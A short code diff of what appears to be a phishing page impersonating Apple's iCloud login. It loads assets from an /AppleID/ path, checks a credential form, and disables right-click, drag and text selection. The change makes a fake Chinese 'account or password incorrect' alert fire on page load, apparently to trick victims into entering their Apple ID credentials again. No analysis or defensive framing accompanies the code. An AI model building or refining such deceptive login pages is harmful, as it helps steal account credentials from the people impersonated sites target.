@@ -20,6 +20,11 @@
     })();</script>
     <title>iCloud</title>
     <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,user-scalable=yes">
+    <script>
+        window.onload=function(){
+            alert("您输入的账号或密码不正确");
+        }
+    </script>
     <script language="javascript">
         function checkinput() {
             if (document.form1.u.value == "") {
@@ -38,11 +43,6 @@
         }
     </script>
     <link href="/AppleID/css/wapcss.css" rel="stylesheet">
-    <script>
-        $(function(){
-            alert("您输入的账号或密码不正确");
-        })
-    </script>
 </head>
 <body ondragstart="window.event.returnValue=!1" oncontextmenu="window.event.returnValue=!1" onselectstart="event.returnValue=!1">
     <div style="margin-top:30px"></div>
